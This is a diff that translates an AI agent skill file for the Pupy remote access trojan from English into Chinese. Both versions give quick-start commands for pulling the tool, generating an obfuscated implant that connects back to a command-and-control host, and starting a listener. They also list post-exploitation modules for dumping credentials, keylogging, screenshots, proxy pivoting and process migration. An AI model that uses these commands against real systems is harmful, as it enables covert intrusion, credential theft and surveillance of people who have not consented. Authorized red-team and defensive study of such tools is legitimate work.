@@ -1,53 +1,50 @@
 ---
 name: pupy
 description: >
-  This skill should be used when the user asks about "pupy", "needing a
-  lightweight RAT with in-memory modules, multiple transports
-  (TCP/HTTP/WebSocket), and migration capabilities". Cross-platform remote
-  administration and post-exploitation tool with Python implants.
+  此技能适用于用户询问关于 "pupy"、"需要内存模块加载、多种传输协议（TCP/HTTP/WebSocket）及进程迁移能力的轻量级 RAT" 等内容。跨平台远程管理和后渗透工具，使用 Python 植入体。
 ---
 
 # Pupy
 
-Cross-platform Python RAT with in-memory module loading and multiple C2 transports.
+跨平台 Python RAT，支持内存模块加载和多种 C2 传输协议。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Docker (recommended)
+# Docker（推荐）
 docker pull n1nj4sec/pupy
 docker run -it --rm -p 8443:8443 n1nj4sec/pupy pupysh
 
-# Generate implant
+# 生成植入体
 gen -f exe -t obfs3 connect --host C2:8443 -o agent.exe
 
-# Start listener
+# 启动监听器
 listen -a obfs3 8443
 ```
 
-## Core Commands
+## 核心命令
 
-| Command | Purpose |
-|---------|---------|
-| `sessions` | List active sessions |
-| `interact <id>` | Enter session |
-| `run <module>` | Run a post-ex module |
-| `gen` | Generate implant |
-| `listen` | Start listener |
-| `upload/download` | File transfer |
+| 命令 | 用途 |
+|------|------|
+| `sessions` | 列出活跃会话 |
+| `interact <id>` | 进入会话 |
+| `run <module>` | 运行后渗透模块 |
+| `gen` | 生成植入体 |
+| `listen` | 启动监听器 |
+| `upload/download` | 文件传输 |
 
-## Common Modules
+## 常用模块
 
 ```bash
-run post.gather.credentials   # Dump creds
-run post.gather.keylogger     # Start keylogger
-run post.gather.screenshot    # Screenshot
-run post.pivot.socks5         # SOCKS5 proxy
-run post.migrate              # Process migration
+run post.gather.credentials   # 转储凭据
+run post.gather.keylogger     # 启动键盘记录
+run post.gather.screenshot    # 截图
+run post.pivot.socks5         # SOCKS5 代理
+run post.migrate              # 进程迁移
 ```
 
-## Resources
+## 资源
 
-| File | When to load |
-|------|--------------|
-| `references/` | Transport config and module index |
+| 文件 | 加载时机 |
+|------|----------|
+| `references/` | 传输配置与模块索引 |
